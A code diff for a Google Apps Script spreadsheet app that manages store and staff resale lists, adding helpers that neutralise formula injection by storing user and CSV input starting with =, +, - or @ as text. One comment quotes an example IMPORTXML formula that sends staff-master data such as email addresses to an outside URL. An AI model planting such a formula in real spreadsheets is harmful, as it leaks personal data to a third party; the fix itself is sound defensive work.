@@ -276,7 +276,7 @@ function getAllShopMasterRows_() {
 /** 店舗マスタの指定行にエリア名を書き込む（4列目が無い旧環境では先に列を補う） */
 function setShopMasterArea_(masterSheet, rowIndex, area) {
   ensureShopMasterAreaColumn_(masterSheet);
-  masterSheet.getRange(rowIndex, 4).setValue(area);
+  masterSheet.getRange(rowIndex, 4).setValue(safeCell_(area));
 }
 
 /**
@@ -1051,7 +1051,7 @@ function addUncontractedDataImpl_(rowObject, staffRowIndex, expectedStaff) {
     const lastRow = sheet.getLastRow();
     const targetRowIndex = lastRow + 1;
     ensureRowCapacity_(sheet, targetRowIndex);
-    sheet.getRange(targetRowIndex, 1, 1, HEADERS_MAIN.length).setValues([newRow]);
+    setValuesSafe_(sheet.getRange(targetRowIndex, 1, 1, HEADERS_MAIN.length), [newRow]);
     // 営業所コード・社員番号は桁落ちしてはいけない列のため、念のためテキスト書式にしておく
     ['営業所コード', '社員番号'].forEach(function (col) {
       const c = HEADERS_MAIN.indexOf(col) + 1;
@@ -1570,7 +1570,7 @@ function importParsedRows_(rows) {
     if (newStaffRows.length > 0 && staffMasterSheet) {
       const staffStartRow = staffMasterSheet.getLastRow() + 1;
       ensureRowCapacity_(staffMasterSheet, staffStartRow + newStaffRows.length - 1);
-      staffMasterSheet.getRange(staffStartRow, 1, newStaffRows.length, 6).setValues(newStaffRows);
+      setValuesSafe_(staffMasterSheet.getRange(staffStartRow, 1, newStaffRows.length, 6), newStaffRows);
     }
 
     // 重複判定キー：対象年月日＋営業所コード＋社員番号＋都市コード＋出発年月
@@ -1615,7 +1615,7 @@ function importParsedRows_(rows) {
       const sheet = ss.getSheetByName(sheetName);
       const startRow = sheet.getLastRow() + 1;
       ensureRowCapacity_(sheet, startRow + newRows.length - 1);
-      sheet.getRange(startRow, 1, newRows.length, HEADERS_MAIN.length).setValues(newRows);
+      setValuesSafe_(sheet.getRange(startRow, 1, newRows.length, HEADERS_MAIN.length), newRows);
       perSheetCounts[sheetName] = newRows.length;
       importedCount += newRows.length;
     });
@@ -1686,7 +1686,7 @@ function autoRegisterShop_(ss, officeCode, csvShopName, csvAreaName) {
     : '未設定(' + officeCode + ')';
   if (masterSheet) {
     ensureShopMasterAreaColumn_(masterSheet);
-    masterSheet.appendRow([officeCode, placeholderName, true, csvAreaName || '']);
+    masterSheet.appendRow([officeCode, safeCell_(placeholderName), true, safeCell_(csvAreaName || '')]);
   }
   const newShop = { code: officeCode, name: placeholderName };
   createShopSheets_(ss, [newShop], HEADERS_MAIN);
@@ -1709,79 +1709,6 @@ function updateShopAreaFromCsv_(ss, officeCode, csvAreaName) {
   const masterSheet = ss.getSheetByName(SHOP_MASTER_SHEET_NAME);
   if (!masterSheet) return;
   setShopMasterArea_(masterSheet, target.rowIndex, csvAreaName);
-}
-
-/**
- * ⑥ SPAグリッド上でのインライン編集（STS／成約PAX）を対象セルへ即時反映する。
- * @param {string} sheetName 対象店舗シート名
- * @param {number} rowIndex シート上の物理行番号（整数）
- * @param {string} newStatus "失注" | "成約" | "リセール中"
- * @param {number|string} contractPax 成約PAX（newStatusが"成約"の場合のみ使用）
- */
-function updateStatus(sheetName, rowIndex, newStatus, contractPax, expectedIdentity) {
-  return lockedEndpoint_(function () { return updateStatusImpl_(sheetName, rowIndex, newStatus, contractPax, expectedIdentity); });
-}
-
-/** updateStatus の本体（同時実行制御は上の公開関数で行う。直接呼ばないこと） */
-function updateStatusImpl_(sheetName, rowIndex, newStatus, contractPax, expectedIdentity) {
-  try {
-    assertShopInScope_(sheetName);
-
-    const rIdx = parseInt(rowIndex, 10);
-    if (isNaN(rIdx) || rIdx < 2) {
-      throw new Error('不正な行番号です: ' + rowIndex);
-    }
-
-    // 空文字は「未対応（－）に戻す」操作。選び間違いを取り消せるよう許可する。
-    const status = String(newStatus === null || newStatus === undefined ? '' : newStatus).trim();
-    const validStatuses = ['', '失注', '成約', 'リセール中'];
-    if (validStatuses.indexOf(status) === -1) {
-      throw new Error('不正なステータスです: ' + newStatus);
-    }
-
-    const ss = SpreadsheetApp.getActiveSpreadsheet();
-    const sheet = ss.getSheetByName(sheetName);
-    if (!sheet) {
-      throw new Error('シートが見つかりません: ' + sheetName);
-    }
-    assertRowIdentity_(sheet, rIdx, expectedIdentity);
-
-    if (status === '') {
-      sheet.getRange(rIdx, 2).clearContent(); // STSを未対応（空欄）に戻す
-    } else {
-      sheet.getRange(rIdx, 2).setValue(status); // STS（2列目）
-    }
-
-    if (status === '成約') {
-      sheet.getRange(rIdx, 3).setValue(normalizeContractPax_(contractPax)); // 成約PAX（3列目）
-
-      // ガードレール：成約になった際、リセール列（1列目）が空白なら自動で初期値を補完する
-      const resaleCell = sheet.getRange(rIdx, 1);
-      const resaleValue = resaleCell.getValue();
-      if (resaleValue === '' || resaleValue === null) {
-        resaleCell.setValue('✖');
-      }
-    } else {
-      sheet.getRange(rIdx, 3).clearContent(); // 成約以外は成約PAXをクリア（未対応に戻した場合も含む）
-    }
-
-    // アラート判定の基準日として、ステータス変更のたびに「最終アクション日」（21列目）を今日の日付で更新する
-    const todayStr = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyy-MM-dd');
-    setTextCell_(sheet, rIdx, 21, todayStr);
-
-    const updatedValues = sheet.getRange(rIdx, 1, 1, HEADERS_MAIN.length).getValues()[0];
-    const updatedObj = {};
-    for (let c = 0; c < HEADERS_MAIN.length; c++) {
-      updatedObj[HEADERS_MAIN[c]] = serializeCellValue_(updatedValues[c]);
-    }
-    updatedObj['対象年月日'] = normalizeTargetDate_(updatedValues[4]);
-    updatedObj.__sheetName = sheetName;
-    updatedObj.__rowIndex = rIdx;
-
-    return { success: true, data: updatedObj };
-  } catch (err) {
-    return { success: false, error: errorForClient_(err) };
-  }
 }
 
 // ---- 行の取り違え防止 --------------------------------------------------------
@@ -1816,7 +1743,7 @@ function assertRowIdentity_(sheet, rowIndex, expected) {
 
 // ---- リセールリストでスタッフが編集できる列（それ以外はCSV由来の読み取り専用） ---
 // 一般スタッフ（店舗スタッフ）も自店舗の行であればこれらを編集できる。
-// 「STS」だけは成約PAXのクリアやリセール補完を伴うため専用API（updateStatus）で更新する。
+// 「STS」だけは成約PAXのクリアやリセール補完を伴うため、updateCellValueでは更新せず、まとめて保存（saveRowChanges）で更新する。
 // 「詳細」はCSV由来だが、相談時に書ききれなかった補足を後から足せるよう編集可としている。
 // CSVの再取込では既存行を上書きしないため（重複キーが一致する行は取り込まずに読み飛ばす）、
 // 手で書き足した内容が取込によって消えることはない。
@@ -1834,6 +1761,36 @@ const TEXT_CELL_COLUMNS = {
   '詳細': true,
   '最終アクション日': true
 };
+
+/**
+ * 利用者・CSVが入力した文字列を、シートへ書き込む前に「文字」として扱われる形にする。
+ * 「=」「+」「-」「@」で始まる文字列をそのまま書くとスプレッドシートが数式として評価してしまい、
+ * 例えば =IMPORTXML("https://外部/?d="&'スタッフマスタ'!D2,"//a") のような入力で
+ * シート内の情報（メールアドレス等）を外部へ送られる恐れがある。
+ * 先頭にアポストロフィを付けると「文字列」として保存され、表示にも読み取り値にも残らない。
+ * （数値として読める文字列「-5」「+3」と、数値・日付・真偽値は、これまでどおり変更しない）
+ */
+function safeCell_(v) {
+  if (typeof v !== 'string' || v === '') return v;
+  if (!/^[=+\-@]/.test(v)) return v;
+  if (/^[+-]?\d+(\.\d+)?$/.test(v)) return v;
+  return "'" + v;
+}
+
+/**
+ * 範囲へ値を書き込む（setValues の安全版）。
+ * 書式が「書式なしテキスト（@）」のセルは、数式として評価されないので値をそのまま書く
+ * （ここでアポストロフィを付けると、そのまま表示されて内容を壊してしまう）。
+ * それ以外のセルは safeCell_ で文字列扱いにしてから書く。
+ */
+function setValuesSafe_(range, rows) {
+  const formats = range.getNumberFormats();
+  range.setValues(rows.map(function (row, i) {
+    return row.map(function (v, j) {
+      return (formats[i] && formats[i][j] === '@') ? v : safeCell_(v);
+    });
+  }));
+}
 
 /**
  * セルを「書式なしテキスト」にしたうえで文字列として書き込む。
@@ -1922,7 +1879,7 @@ function updateCellValueImpl_(sheetName, rowIndex, columnName, value, expectedId
     if (TEXT_CELL_COLUMNS[columnName]) {
       setTextCell_(sheet, rIdx, colIdx + 1, value);
     } else {
-      sheet.getRange(rIdx, colIdx + 1).setValue(value);
+      sheet.getRange(rIdx, colIdx + 1).setValue(safeCell_(value));
     }
 
     // アラート判定の基準日として、セル編集のたびに「最終アクション日」（21列目）を今日の日付で更新する
@@ -1956,7 +1913,7 @@ function updateCellValueImpl_(sheetName, rowIndex, columnName, value, expectedId
  *   { sheetName, rowIndex, 'リセール'?, 'STS'?, '成約PAX'?, 'ACT日'?, 'ACT内容'?,
  *     '次回ACT・進捗★手入力'?, '詳細'? }
  *
- * リセール・STS・成約PAXは、1件ずつ更新する updateStatus と同じ業務ルールを適用する。
+ * リセール・STS・成約PAXには、次の業務ルールを適用する。
  *   ・STSを「成約」にした行は成約PAXを保存し、リセールが空欄なら「✖」を補う
  *   ・STSを「成約」以外（失注／リセール中／未対応）にした行は成約PAXを消す
  *   ・成約PAXだけを変えられるのは、STSが「成約」の行のみ
@@ -2250,7 +2207,7 @@ function removeDuplicateRowsImpl_(dryRun) {
 
       if (!dryRun) {
         // 残す行を先頭から詰めて書き直し、余った行は内容を消す
-        sheet.getRange(2, 1, kept.length, HEADERS_MAIN.length).setValues(kept);
+        setValuesSafe_(sheet.getRange(2, 1, kept.length, HEADERS_MAIN.length), kept);
         const surplus = values.length - kept.length;
         if (surplus > 0) {
           sheet.getRange(2 + kept.length, 1, surplus, HEADERS_MAIN.length).clearContent();
@@ -2318,7 +2275,7 @@ function removeDuplicateStaffRows_(ss, dryRun) {
   const removed = values.length - kept.length;
   if (removed <= 0 || dryRun) return removed;
 
-  sheet.getRange(2, 1, kept.length, 6).setValues(kept);
+  setValuesSafe_(sheet.getRange(2, 1, kept.length, 6), kept);
   sheet.getRange(2 + kept.length, 1, removed, 6).clearContent();
   return removed;
 }
@@ -2496,7 +2453,7 @@ function archiveOldData_(ss) {
       const archiveSheet = ensureArchiveShopSheet_(archiveSs, shop.name);
       const archiveStartRow = archiveSheet.getLastRow() + 1;
       ensureRowCapacity_(archiveSheet, archiveStartRow + rowsForPeriod.length - 1);
-      archiveSheet.getRange(archiveStartRow, 1, rowsForPeriod.length, HEADERS_MAIN.length).setValues(rowsForPeriod);
+      setValuesSafe_(archiveSheet.getRange(archiveStartRow, 1, rowsForPeriod.length, HEADERS_MAIN.length), rowsForPeriod);
 
       countsByPeriod[periodKey] = (countsByPeriod[periodKey] || 0) + rowsForPeriod.length;
       totalArchived += rowsForPeriod.length;
@@ -2504,7 +2461,7 @@ function archiveOldData_(ss) {
 
     // 生き残る行を先頭から詰めて書き直し、余った行は消す（生存行が0件のこともあるためgetRangeを分岐）
     if (toKeep.length > 0) {
-      sheet.getRange(2, 1, toKeep.length, HEADERS_MAIN.length).setValues(toKeep);
+      setValuesSafe_(sheet.getRange(2, 1, toKeep.length, HEADERS_MAIN.length), toKeep);
     }
     const surplus = values.length - toKeep.length;
     if (surplus > 0) {
@@ -2681,7 +2638,7 @@ function mergePlaceholderShopsImpl_() {
           if (toMove.length > 0) {
             const startRow = toSheet.getLastRow() + 1;
             ensureRowCapacity_(toSheet, startRow + toMove.length - 1);
-            toSheet.getRange(startRow, 1, toMove.length, HEADERS_MAIN.length).setValues(toMove);
+            setValuesSafe_(toSheet.getRange(startRow, 1, toMove.length, HEADERS_MAIN.length), toMove);
             moved = toMove.length;
           }
         }
@@ -2735,7 +2692,7 @@ function renameShopIfPlaceholder_(ss, officeCode, currentName, newName) {
   if (dataSheet) dataSheet.setName(newName); // 集計式の参照はGoogleシートが自動で追従する
 
   const masterSheet = ss.getSheetByName(SHOP_MASTER_SHEET_NAME);
-  if (masterSheet) masterSheet.getRange(target.rowIndex, 2).setValue(newName);
+  if (masterSheet) masterSheet.getRange(target.rowIndex, 2).setValue(safeCell_(newName));
   updateShopNameInSummary_(ss, officeCode, newName);
 
   return newName;
@@ -2772,7 +2729,7 @@ function restoreKnownShopNames_(ss) {
     if (dataSheet) {
       dataSheet.setName(properName); // 集計式の参照はGoogleシートが自動で追従する
     }
-    masterSheet.getRange(r.rowIndex, 2).setValue(properName);
+    masterSheet.getRange(r.rowIndex, 2).setValue(safeCell_(properName));
     updateShopNameInSummary_(ss, r.code, properName);
 
     delete usedNames[r.name];
@@ -2935,7 +2892,7 @@ function addShopMasterImpl_(code, name, area) {
     }
 
     ensureShopMasterAreaColumn_(masterSheet);
-    masterSheet.appendRow([code, name, true, area]);
+    masterSheet.appendRow([code, safeCell_(name), true, safeCell_(area)]);
     createShopSheets_(ss, [{ code: code, name: name }], HEADERS_MAIN);
     appendShopRowToSummary_(ss, { code: code, name: name });
 
@@ -2986,7 +2943,7 @@ function renameShopMasterImpl_(code, newName, area) {
       if (dataSheet) {
         dataSheet.setName(newName); // 店舗別サマリの数式（'旧店舗名'!...）はGoogleシートが自動で追従する
       }
-      masterSheet.getRange(target.rowIndex, 2).setValue(newName);
+      masterSheet.getRange(target.rowIndex, 2).setValue(safeCell_(newName));
       updateShopNameInSummary_(ss, code, newName);
     }
 
@@ -3091,7 +3048,7 @@ function updateShopNameInSummary_(ss, code, newName) {
   for (let col = 0; col < lastCol; col += 11) {
     for (let r = 2; r < lastRow; r++) { // 0-indexed：3行目以降がデータ行
       if (String(values[r][col]) === code) {
-        sheet.getRange(r + 1, col + 2).setValue(newName); // 「店舗」セル（1-indexed）
+        sheet.getRange(r + 1, col + 2).setValue(safeCell_(newName)); // 「店舗」セル（1-indexed）
       }
     }
   }
@@ -3131,7 +3088,7 @@ function appendShopRowToSummary_(ss, shop) {
     const colリセール成約率 = startCol + 9;
 
     sheet.getRange(rowNum, col店番).setValue(shop.code);
-    sheet.getRange(rowNum, col店舗).setValue(shopName);
+    sheet.getRange(rowNum, col店舗).setValue(safeCell_(shopName));
     // 数式内のシート参照 '店舗名'! では、店舗名に含まれる ' を '' と二重にしないと数式が壊れる
     const sheetRef = String(shopName).replace(/'/g, "''");
 
@@ -3317,7 +3274,7 @@ function addStaffMasterImpl_(officeCode, employeeNo, employeeName, googleAccount
       throw new Error(setupRequiredMessage_('スタッフマスタ'));
     }
     assertNotLockingSelfOut_(existing.concat([{ active: true, role: role, googleAccount: googleAccount }]));
-    sheet.appendRow([officeCode, normalizeEmployeeNo_(employeeNo), employeeName, googleAccount, role, true]);
+    sheet.appendRow([officeCode, normalizeEmployeeNo_(employeeNo), safeCell_(employeeName), safeCell_(googleAccount), role, true]);
 
     return { success: true, warning: managerAreaWarning_(role, officeCode) };
   } catch (err) {
@@ -3380,7 +3337,7 @@ function updateStaffMasterImpl_(rowIndex, officeCode, employeeNo, employeeName, 
     assertNotLockingSelfOut_(existing.map(function (s) {
       return s.rowIndex === rIdx ? { active: s.active, role: role, googleAccount: googleAccount } : s;
     }));
-    sheet.getRange(rIdx, 1, 1, 5).setValues([[officeCode, employeeNo === undefined || employeeNo === null ? '' : employeeNo, employeeName, googleAccount, role]]);
+    setValuesSafe_(sheet.getRange(rIdx, 1, 1, 5), [[officeCode, employeeNo === undefined || employeeNo === null ? '' : employeeNo, employeeName, googleAccount, role]]);
 
     // 社員名・所属店舗（異動）が変わっていれば、過去に取り込み済みのリセールリストの
     // 該当行（各店舗シート）も合わせて修正する。スタッフマスタの編集だけでは
@@ -3484,7 +3441,7 @@ function applyStaffRenameOrTransfer_(beforeOfficeCode, beforeEmployeeNo, beforeE
     }
     const startRow = destSheet.getLastRow() + 1;
     ensureRowCapacity_(destSheet, startRow + rowsToAppend.length - 1);
-    destSheet.getRange(startRow, 1, rowsToAppend.length, lastCol).setValues(rowsToAppend);
+    setValuesSafe_(destSheet.getRange(startRow, 1, rowsToAppend.length, lastCol), rowsToAppend);
     // 転記先の列がテキスト書式のはずだが、念のため転記した行にも改めて適用しておく
     // （0落ち・日付化を防ぐため。TEXT_CELL_COLUMNSは列全体に書式済みなので通常は不要）
     Object.keys(TEXT_CELL_COLUMNS).forEach(function (colName) {
@@ -3619,7 +3576,7 @@ function registerAccountAsMaster_(email, name) {
   if (!name) {
     return { ok: false, action: 'needName', message: '氏名が必要です。' };
   }
-  sheet.appendRow([HQ_OFFICE_CODE, '', name, email, ROLE_MASTER, true]);
+  sheet.appendRow([HQ_OFFICE_CODE, '', safeCell_(name), safeCell_(email), ROLE_MASTER, true]);
   return { ok: true, action: 'added', message: name + ' さん（' + email + '）を本部所属のマスタ管理者として追加しました。' };
 }
 
@@ -3861,7 +3818,7 @@ function importStaffEmailsImpl_(payload, dryRun) {
       const lastRow = sheet.getLastRow();
       const col = sheet.getRange(2, 4, lastRow - 1, 1).getValues();
       Object.keys(byRow).forEach(function (r) { col[Number(r) - 2][0] = byRow[r]; });
-      sheet.getRange(2, 4, lastRow - 1, 1).setValues(col);
+      setValuesSafe_(sheet.getRange(2, 4, lastRow - 1, 1), col);
       appliedCount = result.apply.length;
     }
 
@@ -4044,7 +4001,7 @@ function buildAiAnalysisSheet_() {
   });
 
   if (values.length > 0) {
-    sheet.getRange(headerRow + 1, 1, values.length, header.length).setValues(values);
+    setValuesSafe_(sheet.getRange(headerRow + 1, 1, values.length, header.length), values);
   }
   sheet.setFrozenRows(headerRow);
   sheet.autoResizeColumns(1, header.length);
@@ -4130,7 +4087,7 @@ function saveAiReportImpl_(scopeLabel, body) {
     const author = ctx.employeeName || ctx.email || '（未登録ユーザー）';
     // 新しいものが上に来るよう、ヘッダーの直下へ挿入する
     sheet.insertRowAfter(1);
-    sheet.getRange(2, 1, 1, 4).setValues([[savedAt, author, String(scopeLabel || ''), body]]);
+    setValuesSafe_(sheet.getRange(2, 1, 1, 4), [[savedAt, author, String(scopeLabel || ''), body]]);
     sheet.getRange(2, 4).setWrap(true);
 
     return { success: true, report: { savedAt: savedAt, author: author, scope: String(scopeLabel || ''), body: body } };
